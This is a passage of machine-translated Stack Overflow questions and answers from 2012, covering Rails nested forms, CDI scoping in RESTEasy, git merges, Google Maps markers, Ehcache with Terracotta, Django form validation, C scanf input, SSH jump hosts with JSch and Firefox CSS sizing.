    # @expt_samples.each do |samp|
    #   samp.expts.build
    # end
  end 
```

然后将它们发送到创建操作，在该操作中更新示例详细信息并可以创建 expt 值。

```
def create_study
    @samples = Sample.update(params[:samples].keys, params[:samples].values).reject { |p| p.errors.empty? }
      if @samples.empty? 
        flash[:notice] = "Samples updated"
        redirect_to :action => "add_expt_details", :anchor => "ok"
      else
        render :action => 'edit_individual'
      end
  end 
```

有没有办法实现这一点，我使用了accepted_nested_attributes_for :expts, :dependent => :destroy。但我似乎在某些地方错了，我不想有一个包含很多字段的表单。

我收到的错误消息是“未知键：3、6、12”

所有建议表示赞赏。

# java - REST 身份验证：CDI 安全吗？CDI @Produces 的哪个范围？

> ID：10446323
> 
> 赞同：4
> 
> 时间：2012-05-04T09:36:16.637
> 
> 标签：java, rest, cdi, resteasy, jboss7.x

我在 JBoss-7 环境中使用 ReastEasy，目前正在实施安全功能。我正在使用带有 SSL 连接的 HTTP Basic。添加和评估标头参数很容易（感谢[使用 REST API 在消息标头中传递参数](https://stackoverflow.com/questions/3892682)）：

```
@Provider @ServerInterceptor
public class RestSecurityInterceptor implements PreProcessInterceptor
{
  @EJB MyBean fUser;
  private MyUser user;  

  @Override
  public ServerResponse preProcess(HttpRequest request, ResourceMethod method)
                                                     throws UnauthorizedException
  {
     // do some some stuff. If the request is authenticated I get a MyUser      
    user = ...
  }

  @Named @Produces @SessionScoped
  public MyUser getCurrentUser() {return user;}
} 
```

这很好用，`@Produces`而且`@Inject`我的 REST 服务中的 and 也很有魅力。

```
@Path("/rest")
public class MyService extends Application
{
  @Inject private MyUser currentUser;

  @GET @Path("/test")
  public String test()
  {
    return "Hello "+currentUser.getName();
  }
} 
```

现在我的问题是：以这种方式实现 REST 的安全性是否*安全*（我不想讨论 HTTP Basic 的优缺点，让我们专注于 CDI）？特别是我想知道我是否可以像描述的那样使用 CDI，以及我是否选择了正确的范围`@SessionScoped`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-06T04:47:18.093

会话范围不起作用。已经有一些关于 REST 和会话范围的问题。会话范围对于 JAX-RS 和 JAX-WS 调用都不是活动的。

# git - 用 git 理解奇怪的分支合并

> ID：10446330
> 
> 赞同：1
> 
> 时间：2012-05-04T09:36:29.753
> 
> 标签：git, merge, branch, git-branch

我正在开发一个名为 sidebar 的远程分支，像这样创建（来自我的电脑，而不是远程仓库）：

```
$ git branch sidebar
$ git checkout sidebar
$ git push -u origin sidebar
$ git pull origin sidebar 
```

在侧边栏分支上进行一些提交后，我将其推送到了仓库：

```
$ git push origin sidebar 
```

现在似乎侧边栏已合并到主控，我不明白为什么：

```
$ git log --graph

* commit 3830b6e72f4249cd15c7a35e47a2
| Author: me
| Date:   Mon Apr 30 16:56:28 2012 +0200
| 
|     re-build sidebar boxes
|    
*   commit e97e63b05a522e29d3ca97a509e3652d
|\  Merge: eb1ebfd ed10585
| | Author: me
| | Date:   Sat Apr 28 15:54:19 2012 +0200
| | 
| |     Merge branch 'master' of 
| |   
| * commit 6495e5bd7ac12364a4a12389f58
| | Author: misterX
| | Date:   Sat Apr 28 03:46:58 2012 +0200
| | 
| |     FB: add friend list with statistics
| |   
* | commit eb89c0bbb5516b1ed795b9fc958
|/  Author: me
|   Date:   Sat Apr 28 15:54:08 2012 +0200
|   
|       add product img lens icon 
```

你知道发生了什么事，我哪里错了吗？

编辑：也许以下可以帮助

```
$ git remote show origin
Password: 
* remote origin
  Fetch URL: user@repo
  Push  URL: user@repo
  HEAD branch: master
  Remote branches:
    master  tracked
    sidebar tracked
  Local branches configured for 'git pull':
    master  merges with remote master
    sidebar merges with remote sidebar
  Local refs configured for 'git push':
    master  pushes to master  (local out of date)
    sidebar pushes to sidebar (fast-forwardable) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-21T14:45:54.137

该 gitlog 表明发生了以下情况：

*   作者 misterX 做了一个提交（在 2012 年 4 月 28 日星期六 03:46:58 +0200）并在提交 eb89c0bbb5516b1ed795b9fc958（2012 年 4 月 28 日星期六 15:54:08 +0200）之前的最后一次拉动*之后推送它。*这导致了一个分叉，因为您的提交和来自 misterX 的提交都是基于之前的提交
*   你`git pull`在提交后的 11 秒内做了 a。Git 非常聪明，此时注意到侧边栏分支的本地头部与远程侧边栏头部仅在一次提交中不同，并且由于没有发生合并冲突，因此默默地合并了提交。这是完全正常的行为，除了声称这发生在分支主机上的消息。您使用的 git 版本存在错误，或者您`git checkout master`在某些时候不小心切换到 master via - 检查输出`git branch`

在一个侧节点上，如果您不想要这种合并行为，您可以改用`git pull --rebase`它，它将尝试将您的所有提交重新设置在自上次拉取以来其他人推送的提交之上。这样一来，历史看起来会更清晰，尽管提交日期可能会暗示有人经历过时间旅行……

# javascript - 在缩放级别 3 隐藏谷歌地图中的标记

> ID：10446335
> 
> 赞同：1
> 
> 时间：2012-05-04T09:36:51.057
> 
> 标签：javascript, map

如何在缩放级别 3 中隐藏谷歌地图中的标记，并且在放大时（最高 16 级）我必须再次显示标记。我正在使用 Google Maps JavaScript API v3。

注意：地图中只有一个标记。

任何人都可以帮我完成这件事吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T09:45:25.287

您必须向`zoom_changed`地图添加一个事件，并检查您的地图是哪个缩放级别并采取相应措施。另请参阅 API 参考：[地图事件](https://developers.google.com/maps/documentation/javascript/reference#Map)和[叠加层](https://developers.google.com/maps/documentation/javascript/overlays#OverlaysOverview)。

部分代码（您可能想在这里和那里更新/添加一些东西）：

```
var marker = new google.maps.Marker({
    position: location,
    map: map
});

google.maps.event.addListener(map, 'zoom_changed', function() {
    var zoom = map.getZoom();

    // Update May 2017
    //   You can now use setVisible() on a marker instead of
    //   setting the map to a null value.
    if (zoom <= 3) {
        marker.setMap(null);
    } else {
        marker.setMap(map);
    }
}); 
```

# iphone - 像 iPad 照片应用程序一样为 UIView 设置动画

> ID：10446336
> 
> 赞同：0
> 
> 时间：2012-05-04T09:36:51.853
> 
> 标签：iphone, ios, ipad, animation, core-animation

我想制作一个应用程序，例如 iPad 的照片，它以网格方式显示照片，并在单击自定义视图后从其当前位置动画。我只是想知道如何从当前位置为视图设置动画，例如如果我单击第一行的自定义视图，那么它将显示从顶部位置动画的自定义视图，如果我单击其中的自定义视图底线然后它将从底部位置显示和动画自定义视图，中间线也相同。任何帮助和建议将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T09:41:36.377

如果您不指定 from 值，则当前值是默认值。如果您仍想指定默认值，则图像的当前帧可能会这样做。

根据您的应用程序中接下来发生的情况以及图像是否调整大小，您可能还需要为变换设置动画。否则，只需将帧从其当前值设置为 [[UIScreen mainScreen] applicationFrame]; 将是一个很好的起点。

此外，根据您的图像在视图层次结构中的位置，如果您确实希望图像在点击时全屏显示，您可能需要将其移动到选项卡栏和导航栏的顶部。

# ehcache - 使用 terracotta 设置休眠分布式 ehcache 时的会话工厂问题

> ID：10446338
> 
> 赞同：2
> 
> 时间：2012-05-04T09:36:55.003
> 
> 标签：ehcache, terracotta, nhibernate-caches

我正在尝试使用 Terracotta 在分布式环境中设置 EHCache。在这里，我可以连接应用程序服务器和 Terracotta 服务器，在 terracotta Developer Console 中，我可以看到复制的对象。

但是在应用程序服务器中不断出现以下异常消息，尽管应用程序的其余部分运行正常：

**大家好，如果有任何机构可以指导为什么会出现此异常消息以及我们如何解决它。此外，如果有任何关于为休眠应用程序设置兵马俑的综合教程，这对我也会有所帮助。**

这里 [CacheByAmitNode8081] 是我在应用服务器中定义的缓存节点的名称。

```
[DEBUG][04/05/12 12:49:07.973][CacheByAmitNode8081] Running mbean initializer task for ehcache hibernate...
[DEBUG][04/05/12 12:49:07.995][CacheByAmitNode8081] Successfully registered bean
[ERROR][04/05/12 12:49:08.000][CacheByAmitNode8081] Error locating Hibernate Session Factory
java.lang.NullPointerException
at sun.reflect.UnsafeFieldAccessorImpl.ensureObj(UnsafeFieldAccessorImpl.java:36)
at sun.reflect.UnsafeQualifiedObjectFieldAccessorImpl.get(UnsafeQualifiedObjectFieldAccessorImpl.java:20)
at java.lang.reflect.Field.get(Field.java:358)
at org.hibernate.cache.ehcache.management.impl.ProviderMBeanRegistrationHelper$RegisterMBeansTask.locateSessionFactory(ProviderMBeanRegistrationHelper.java:152)
at org.hibernate.cache.ehcache.management.impl.ProviderMBeanRegistrationHelper$RegisterMBeansTask.run(ProviderMBeanRegistrationHelper.java:117)
at java.util.TimerThread.mainLoop(Timer.java:512)
at java.util.TimerThread.run(Timer.java:462)
[DEBUG][04/05/12 12:49:08.001][CacheByAmitNode8081] SessionFactory is probably still being initialized... waiting for it to complete before enabling hibernate statistics monitoring via JMX
[DEBUG][04/05/12 12:49:08.001][CacheByAmitNode8081] Running mbean initializer task for ehcache hibernate...
[ERROR][04/05/12 12:49:08.001][CacheByAmitNode8081] Error locating Hibernate Session Factory
java.lang.NullPointerException
at sun.reflect.UnsafeFieldAccessorImpl.ensureObj(UnsafeFieldAccessorImpl.java:36)
at sun.reflect.UnsafeQualifiedObjectFieldAccessorImpl.get(UnsafeQualifiedObjectFieldAccessorImpl.java:20)
at java.lang.reflect.Field.get(Field.java:358)
at org.hibernate.cache.ehcache.management.impl.ProviderMBeanRegistrationHelper$RegisterMBeansTask.locateSessionFactory(ProviderMBeanRegistrationHelper.java:152)
at org.hibernate.cache.ehcache.management.impl.ProviderMBeanRegistrationHelper$RegisterMBeansTask.run(ProviderMBeanRegistrationHelper.java:117)
at java.util.TimerThread.mainLoop(Timer.java:512)
at java.util.TimerThread.run(Timer.java:462)* 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T16:18:36.613

当你使用 Terracotta 时，你需要在你的类路径中添加特定的 terracotta jars 来替换 ehcache 实现。在您的异常堆栈中，我没有看到任何兵马俑类输出...

在我的 Maven 依赖项中，我有：

```
<dependency>
  <groupId>net.sf.ehcache</groupId>
  <artifactId>ehcache-core-ee</artifactId>
  <version>2.5.2</version>
  <scope>compile</scope>
</dependency>
<dependency>
  <groupId>net.sf.ehcache</groupId>
  <artifactId>ehcache-terracotta-ee</artifactId>
  <version>2.5.2</version>
  <scope>compile</scope>
</dependency>
<dependency>
  <groupId>org.terracotta</groupId>
  <artifactId>terracotta-toolkit-1.5-runtime-ee</artifactId>
  <version>4.2.0</version>
  <scope>compile</scope>
</dependency> 
```

**您还可以查看关于如何插入 Hibernate 的 Terracotta 教程**：http : [//terracotta.org/documentation/enterprise-ehcache/get-started-hibernate](http://terracotta.org/documentation/enterprise-ehcache/get-started-hibernate)

# javascript - 每次都调用jQuery ajaxComplete？

> ID：10446340
> 
> 赞同：5
> 
> 时间：2012-05-04T09:37:02.647
> 
> 标签：javascript, jquery, ajax

我有一个关于 .ajaxComplete() 的问题。

假设我这样做：

```
// Register an ajaxComplete (pseudo code ish)
$('#someId').ajaxComplete(function () {
    if (ajaxCompleted == isAjaxImWaitingForToComplete) {
        // something something
    }
}); 
```

然后每次 ajax 任务完成时都会调用它。有没有办法让它只被调用一次，然后注销？我可以添加 $('#someId').unbind(); 在 ajaxComplete 内函数的底部？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-04T09:45:08.173

该函数为[AJAX 事件](http://docs.jquery.com/Ajax_Events)`.ajaxComplete()`绑定了一个处理程序，因此调用应该可以工作。`ajaxComplete` `.unbind('ajaxComplete');`

# windows - 摩托罗拉 MC3190 掌上电脑的 windows 6.0 ce 任务管理器

> ID：10446343
> 
> 赞同：3
> 
> 时间：2012-05-04T09:37:13.047
> 
> 标签：windows, windows-ce, taskmanager

我试图找出为什么网页会导致摩托罗拉 MC3190 发生内存泄漏。

条码扫描仪是 Windows 6.0 CE 中的新功能。没有安装程序只有默认。我们只用IE。

当我们使用它两周后，扫描仪内存耗尽并且崩溃了。完全重启后就可以正常使用了，只重启Internet Explorer也没有用。仅使用 Internet Explorer。我试着找一些像任务管理器这样的程序来找出 IE 是否有内存泄漏。

我问是因为 Windows CE 6.0 没有任务管理器。

关于如何检查内存使用情况的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T16:42:17.090

我怀疑你是否自己做了很多调查。对我来说，一个简单的搜索引擎查询出现了很多有希望的结果，如下所示：

*   [CodeProject 上的任务管理器](http://www.codeproject.com/Articles/30871/Task-Manager-for-Windows-Mobile-and-Windows-CE)
*   [iTaskManager](http://urana.info/mobile/wince/itaskmgr/index.html)
*   [远程任务监视器](http://www.remotetaskmonitor.com/)
*   [Windows CE 任务管理器](http://www.vttoth.com/CMS/index.php/222)

此外，如果您只想监控进程的内存使用情况，使用[toolhelp API](http://msdn.microsoft.com/en-us/library/aa450774.aspx)滚动您自己的监控应用程序将非常简单。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T19:20:52.940

我尝试了远程任务监视器以示畏惧。它做得很好。[https://www.osletek.com/pg/2186/Remote_Task_Monitor_for_Embedded_Devices](https://www.osletek.com/pg/2186/Remote_Task_Monitor_for_Embedded_Devices)

# sql - Silverlight 4 导航应用程序中的页面身份验证

> ID：10446344
> 
> 赞同：2
> 
> 时间：2012-05-04T09:37:30.097
> 
> 标签：sql, wcf, silverlight, navigation

我几乎是 C# 编程的新手，我一直在寻找相当长的时间。

我需要有关 Silverlight 导航应用程序中页面身份验证的帮助。

我有一个正在运行的 SQL 数据库和一个从该数据库中获取凭据的 WCF 服务。当用户登录时，他需要在右上角看到一个包含他的个人资料的链接。

如果不使用 silverlight 的任何帮助，我该如何做到这一点？这甚至可能吗？我可以自己编写一个说“此用户已通过身份验证并且可以看到以下页面”的类吗？

这是一个非常紧迫的问题。所以提前感谢任何人的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T09:07:56.133

首先使用 AspNet Membership ，您需要实现的大多数类。此链接向您展示如何将会员表设置到您的 SQL Server 数据库。

[http://weblogs.asp.net/sukumarraju/archive/2009/10/02/installing-asp-net-membership-services-database-in-sql-server-expreess.aspx](http://weblogs.asp.net/sukumarraju/archive/2009/10/02/installing-asp-net-membership-services-database-in-sql-server-expreess.aspx)

在会员结构中，您可以注册，删除，锁定 - 解锁，存储用户详细信息操作......等等。这是一篇为您解释成员资格实施的文章，

[http://blogs.msdn.com/b/kylemc/archive/2010/05/10/using-asp-net-membership-in-silverlight.aspx](http://blogs.msdn.com/b/kylemc/archive/2010/05/10/using-asp-net-membership-in-silverlight.aspx)

# iphone - GData 目标 c 错误

> ID：10446346
> 
> 赞同：0
> 
> 时间：2012-05-04T09:37:44.770
> 
> 标签：iphone, objective-c, ios, gdata

我正在尝试在 xcode 4.2 中将 GData 集成到我的应用程序中。我正在按照[此链接](http://hoishing.wordpress.com/2011/08/23/gdata-objective-c-client-setup-in-xcode-4/)进行集成，但是在构建应用程序时出现以下错误。任何人都可以指导我解决这个问题。

![集成 GData 时出错](../Images/6e070d1118ff4c7d72efda75fcdf52de.png)

# css - Less：在渲染的 CSS 中显示行号原始文件和行号

> ID：10446347
> 
> 赞同：5
> 
> 时间：2012-05-04T09:37:50.250
> 
> 标签：css, less

LESS 中是否有任何方法可以在渲染的 CSS 中渲染原始 LESS 文件 + 行号？就像 Middleman 对 SASS 所做的那样......（我不确定它是 SASS 还是 Middleman 功能）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T09:48:58.330

我不熟悉[Middleman ，但](http://middlemanapp.com/)[FireLess](https://github.com/clearideaz/FireLess)的 GitHub 页面（我猜是受[FireSass](https://addons.mozilla.org/en-US/firefox/addon/firesass-for-firebug/)启发）建议它将在 Firebug 中显示 Less 行号，而不是编译后的 CSS 行号。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-01-15T16:39:29.223

我不知道为什么选择的答案是正确的——它与为 .NET 框架构建的 LESS 的不同构建有关，而不仅仅是 LESS 本身。

无论如何，是的，LESS 确实支持这一点。它的文档记录不是特别好，但是如果您使用`--line-numbers=[comments|mediaquery|all]` [flag](https://github.com/less/less.js/wiki/Command-Line-Usage)进行编译，它将使用已建立的调试信息规范 SASS 编译您的 CSS。

如果您使用的是 Grunt 和 grunt-contrib-less，则可以使用该`dropLineNumbers` [选项](https://github.com/gruntjs/grunt-contrib-less#dumplinenumbers)（名字的选择真的很奇怪，恕我直言）。我通常将我的设置为`all`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T15:51:47.403

现在在 dotless 中有一个选项可以按照 sass 的方式输出此信息。标志是“调试”。它将包含在下一个版本中 - [https://github.com/dotless/dotless/issues/186](https://github.com/dotless/dotless/issues/186)

# android - 使用 eclipse 运行签名的 APK 时会重新编译

> ID：10446356
> 
> 赞同：1
> 
> 时间：2012-05-04T09:38:07.453
> 
> 标签：android, adt

现在我正在使用 ADT18。我之前一直在使用 Eclipse 安装 APK，使用 ADT15 或 16 在设备上运行 singed APK。但是使用 ADT18，当我尝试运行（安装）签名 APK 时，可爱的 eclipse 重新编译并覆盖签名（导出）APK。

在 Google Play 上发布 APK 之前，我需要在我的设备上运行它。我想通过用eclipse运行它来安装它。一年多以来，我一直在做这个练习。但是现在我不能使用 ADT18，我不得不以不同的方式安装 APK。

我怎样才能告诉 Eclipse 不要重新编译我签名的 APK 并安装并运行它。

提前致谢。

# javascript - 使用 nsstring 编码

> ID：10446360
> 
> 赞同：0
> 
> 时间：2012-05-04T09:38:31.427
> 
> 标签：javascript, objective-c, ios

我正在开发一个带有用途的 iOS 应用程序`UIWebView`和`Javascript`. 我有这样的`javascript`功能：

```
function(){
.... 
escape(text);
.....
return text;
} 
```

在我的 UIWebView 中：

```
NSString *myString = [webView stringByEvaluatingJavascript@"function()"]; 
```

这个函数返回给我一个用javascript函数espace编码的字符串，我如何用objective C解码这个字符串？谢谢你的回答

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T09:45:18.910

要使用百分比转义对 NSString 进行编码，请使用**stringByAddingPercentEscapesUsingEncoding**例如。

```
NSString * escapedString = [unescapedString stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; 
```

要解码已经转义的 NSString，请使用**stringByReplacingPercentEscapesUsingEncoding**例如。

```
NSString * unescapedString = [escapedString stringByReplacingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; 
```

请参阅[NSString的文档](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSString_Class/Reference/NSString.html)

# python - Django 表单错误：选择一个有效的选项。29 不是可用的选择之一

> ID：10446361
> 
> 赞同：1
> 
> 时间：2012-05-04T09:38:34.760
> 
> 标签：python, django, django-forms

**表单 HTML**

```
<form action="" method="post" class="form-horizontal"><div style="display:none"><input type="hidden" name="csrfmiddlewaretoken" value="6b3d58df7bd4f6d10975462aaf3bd42d"></div>
        <input type="hidden" name="paper" value="5225" id="id_paper"><fieldset><div id="div_id_priority" class="control-group">
    <label class="control-label" for="id_priority">Priority</label>
    <div class="controls">
        <select name="priority" id="id_priority">
<option value="1" selected="selected">Primary</option>
<option value="2">Secondary</option>
</select>

        <p class="help-block"><span class="help_text">Primary - 1st Choice. Secondary - 2nd Choice.</span></p>

    </div>
</div> <!-- /clearfix -->
<div id="div_id_topic" class="control-group">
    <label class="control-label" for="id_topic">Topics</label>
    <div class="controls">
        <select name="topic" id="id_topic">
<option value="6">A</option>
<option value="7" selected="selected">B</option>
<option value="9">C</option>
</select>

    </div>
</div> <!-- /clearfix -->
<div id="div_id_subtopic" class="control-group error">
    <label class="control-label" for="id_subtopic">SubTopics</label>
    <div class="controls">
        <select name="subtopic" id="id_subtopic">
<option value="29">KEEPER</option></select>

        <span class="help-inline">Select a valid choice. 29 is not one of the available choices.</span>

    </div>
</div> <!-- /clearfix -->
</fieldset>

        <div class="form-actions">
            <button type="submit" class="btn btn-primary">Add</button>
        </div>

    </form> 
```

**看法**

```
@login_required
@event_required
def add_topic(request, paper_id):
    event = request.event
    paper = get_object_or_404(SubmissionImportData, pk=paper_id)
    form = TopicForm(request.POST or None, event=event, paper=paper)
    print request.POST  # i see subtopic here
    print form.errors
    if request.method == 'POST' and form.is_valid():
        cd = form.cleaned_data
        subtopic = request.POST.get('subtopic')
        if subtopic:
            subtopic_obj = get_object_or_404(SubTopic, pk=subtopic)
        else:
            subtopic_obj = None

        paper_topic = PaperTopic.objects.get_or_create(
                submission_import_data=paper,
                priority=cd['priority'],
                topic=cd['topic'],
                sub_topic=subtopic_obj)[0]

        msg = 'Topic Successfully Added'
        messages.success(request, msg)
        url = reverse('submissions_nonadmin_view_topic',
                args=[event.slug, paper.id])
        return redirect(url) 
```

**表格类**

```
class TopicForm(BootstrapForm):
    topic = forms.ModelChoiceField(label='Topics',
            queryset=None, required=False, empty_label=None)
    subtopic = forms.ChoiceField(label='SubTopics',
            widget=forms.Select(attrs={'disabled': 'disabled'}),
            required=False)
    paper = forms.IntegerField(widget=forms.HiddenInput())
    priority = forms.ChoiceField(label='Priority',
            choices=PaperTopic.PRIORITY, required=False)

    class Meta:
        fields = (
                'priority', 'topic', 'subtopic', 'paper',
                )
        layout = (
                Fieldset('', 'priority', 'topic', 'subtopic', 'paper',),
                )

    def __init__(self, *args, **kwargs):
        event = kwargs.pop('event')
        #paper_topic = kwargs.pop('paper_topic')
        paper = kwargs.pop('paper')
        super(TopicForm, self).__init__(*args, **kwargs)
        self.fields['paper'].initial = paper.id
        self.fields['topic'].queryset = Topic.objects.\
                filter(setting=event.setting)
        self.fields['priority'].help_text = 'Primary - 1st Choice. Secondary - 2nd Choice.'
        #if paper_topic:
            #self.fields['topic'].initial = Topic.objects.\
                    #get(pk=paper_topic.topic.id)

    def clean(self):
        '''
        Limit topic associations to 2
        '''
        print 111, self.cleaned_data  # subtopic field is missing here
        cleaned_data = self.cleaned_data
        topic = cleaned_data.get('topic', None)
        subtopic = cleaned_data.get('subtopic', None)
        paper = cleaned_data.get('paper', None)
        priority = cleaned_data.get('priority', None)
        paper_obj = get_object_or_404(SubmissionImportData, pk=paper)

        if topic:
            topic_count = PaperTopic.objects.\
                    filter(submission_import_data=paper_obj).count()
            if topic_count >= 2:
                raise forms.ValidationError("You can only select up to two sets of topic and subtopic associations.")

        if PaperTopic.objects.filter(submission_import_data=paper_obj,
               priority=priority).exists():
            raise forms.ValidationError("You have already chosen that priority level.")
        if PaperTopic.objects.filter(submission_import_data=paper_obj,
               topic=topic, sub_topic=subtopic).exists():
            raise forms.ValidationError("You have already chosen that set of Topic and Subtopic association.")
        print 999999000000
        return cleaned_data 
```

当我尝试提交表单时，出现此错误： `<span class="help-inline">Select a valid choice. 29 is not one of the available choices.</span>`.

我正在根据主题中选择的值通过 AJAX 动态生成子主题下拉列表的选项。

我可以看到`subtopic`我的`request.POST`，但是当它到达`clean`方法时，该`subtopic`字段消失了。

我不太确定发生了什么..

**更新**

另一件事，当 subtopic 没有值时，该`select`元素设置为`disabled=disabled`. 当我尝试像这样提交我的表单时，我可以`subtopic`在我的干净方法中获取字段。而当该字段未被禁用时，我无法以我的干净方法获得它。这就像我所期待的相反行为..

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-04T10:25:12.587

`ChoiceField()`需要一个选项列表来验证 to。虽然你这样做是为了`topic`

```
self.fields['topic'].queryset = Topic.objects.\
                filter(setting=event.setting) 
```

`subtopic`被初始化为一个空列表，因此没有任何选项是有效的。

您必须`self.fields['subtopic'].choices`使用每个可能的子主题实例初始化 ，并使用 Javascript 决定将显示/隐藏哪些子主题（取决于选择的主题）。

# c - 如何在 C 中将 scanf() 用于多维字符数组

> ID：10446365
> 
> 赞同：1
> 
> 时间：2012-05-04T09:38:57.470
> 
> 标签：c, multidimensional-array, char, scanf

我正在尝试使用此代码将值输入到 C 中的多维 char 数组中。

编码：

```
char s[2][2];
    char TRUE = '1';

for (i =0; i < 2; i++)
{
    for (j = 0; j < 2; j++)
    {

        scanf("%c\n", &s[i][j]);
        printf("%c\n", (char)s[i][j]);
        printf("###\n");
        if (s[i][j] == TRUE)
            printf("Char are equal\n");
        else
            printf("Not\n");
    }
} 
```

问题是对于第一个 scanf()，我得到的是 Null 值。此代码仅在第二个 scanf() 中有效。

代码目的是输入“1”和“0”值，然后比较输入是否等于 TRUE（“1”）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T09:55:34.343

默认情况下有很多问题`scanf()`。你应该这样称呼它：

```
scanf("%c", &s[i][j]);
fflush(stdin); 
```

或者如果`fflush()`在您的操作系统上不可用，这将有所帮助：

```
do scanf("%c", &s[i][j]); while (getchar() != '\n'); 
```

希望有帮助:)

# java - Java SSH 从另一台远程机器连接到远程机器

> ID：10446366
> 
> 赞同：0
> 
> 时间：2012-05-04T09:38:58.410
> 
> 标签：java, linux, ssh

我已经搜索过这个问题，分析了几个开源工具（如[Ganymed SSH-2](http://www.ganymed.ethz.ch/ssh2/)、[SSHJ](https://github.com/shikhar/sshj)、[sshxcute](http://code.google.com/p/sshxcute/)），但找不到从远程机器连接到远程机器的任何解决方案。我所拥有的是：
1）机器 B 在防火墙后面，对 Internet 不可见（而不是在我的基础设施中）
2）我可以从机器 A 连接到机器 B（这也不在我的基础设施中）
3）我需要从我的机器连接到机器 A（非常简单的解决方案，任何列出的 SSH 库都可以做到这一点）以及从机器 A 连接到机器 B（可能我缺乏关于 SSH 协议的知识，或者列出的工具都不能做到？）。
我找到了一个库，它允许描述的连接场景是[J2SSH](http://www.javassh.com/products/j2ssh-maverick)，但它不是免费的。问题是，是否有任何免费库可以让我进行描述的连接？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:50:00.390

您需要了解 SSH 隧道。做你想做的事很容易。看看这个教程[http://www.rzg.mpg.de/networkservices/ssh-tunnelling-port-forwarding](http://www.rzg.mpg.de/networkservices/ssh-tunnelling-port-forwarding)。“门”和“工作”大致相当于“B”和“A”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T17:13:09.383

参考 JSch 的示例程序[http://www.jcraft.com/jsch/examples/JumpHosts.java.html](http://www.jcraft.com/jsch/examples/JumpHosts.java.html)。

```
$ wget http://www.jcraft.com/jsch/examples/JumpHosts.java
$ wget http://sourceforge.net/projects/jsch/files/jsch.jar/0.1.48/jsch-0.1.48.jar
$ javac -cp ./jsch-0.1.48.jar:. JumpHosts.java
$ java -cp ./jsch-0.1.48.jar:. JumpHosts usrA@hostA usrB@hostB 
```

# javascript - CSS高度在Firefox中不起作用

> ID：10446375
> 
> 赞同：0
> 
> 时间：2012-05-04T09:39:18.803
> 
> 标签：javascript, jquery, asp.net, css, firefox

我在我的页面中嵌入了一个媒体播放器。

我已经检测到浏览器解决方案来调整播放器的宽度和高度。

但我发现它在 Firefox 中不起作用。

请给个建议。谢谢。

```
<object id="player" width="300" height="400" classid="CLSID:22d6f312-b0f6-11d0-94ab-0080c74c7e95" codebase="http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=5,1,52,701">

    <PARAM NAME="stretchToFit" Value="1"> 
    ...................
    <embed type="application/x-mplayer2" pluginspage="http://www.microsoft.com/Windows/Downloads/Contents/Products/MediaPlayer/" name="MediaPlayer" src="http://xxxxxxxxxxxxxx" 
    showcontrols="1" showpositioncontrols="0" showaudiocontrols="1" showtracker="0" showdisplay="0" showstatusbar="1" showgotobar="0" 
    showcaptioning="0" autostart="1" autorewind="0" animationatstart="0" transparentatstart="0" allowchangedisplaysize="0" 
    allowscan="0" enablecontextmenu="0" clicktoplay="0" width="300" height="400" stretchToFit="1"></embed> 
```

jquery/javascript 代码如下：

```
jQuery(document).ready(function() {

        var height;
        var width;
        var paddingtop;

        if (screen.width <= 1280) {
            width = ($(window).width() - 20);
            height = width / 2;
            paddtingtop = 4;

        }
        else if ((screen.width > 1280) && (screen.width < 1920)) {
            width = ($(window).width() - 20);
            height = width / 1.7;
            paddtingtop = 7;

        }
        else {
            width = ($(window).width() - 20);
            height = width / 1.7;
            paddtingtop = 7;

        }
        $("#player").css('width', width);
        $("#player").css('height', height);
        $("#player").css('padding-top', paddtingtop);

    }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:29:28.200

对于宽度，您不需要 javascript 使其窗口宽度小于 20px，您可以使用 css。这是一个简单的例子：http: [//jsfiddle.net/m5GaA/](http://jsfiddle.net/m5GaA/)

您可以在这里找到更彻底的 css 答案：[xHTML/CSS: How to make inner div get 100% width minus another div width](https://stackoverflow.com/questions/2198116/xhtml-css-how-to-make-inner-div-get-100-width-minus-another-div-width)

除了已经提到的最后一个 else 之外，第二个 if 中的 (screen.width > 1280) 是多余的，前一个 if 已经保证了该条件。

您缺少结束标记，您的页面是否也缺少此标记？这可能是原因。

我不明白为什么其他方法不起作用，但 html/css 可能是问题的根本原因，如果您仍然需要，请尝试提供演示。

jsfiddle 代码：

```
#HTML
<div id=wrapper>
  <div id=inner>
    content must be present
  </div>
</div>​

#CSS
#wrapper {
    overflow:hidden;
    background-color:red;         
    padding: 0px 10px 0px 10px;
    width:100%;
    height:100%;    
}

#inner {
    float:left;
    background-color:blue;       
    width:100%;
    height:100%;
} 
```

# jquery - jQuery 可以读取 cookie 吗？

> ID：10446381
> 
> 赞同：3
> 
> 时间：2012-05-04T09:39:52.460
> 
> 标签：jquery, user-interface, cookies

简单的例子：我想在页面上有一些项目（比如 div 或表格行），我想让用户点击它们来选择它们。这在 jQuery 中似乎很容易。为了在没有服务器端回传的情况下保存用户点击的项目，我认为 cookie 将是完成此任务的一种简单方法。

在这种情况下是否可以假设 cookie 是可以的，对吗？如果正确，jQuery API 是否有某种方式可以比默认的 JavaScript API 更好地读取/写入 cookie 信息？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-04T09:41:12.320

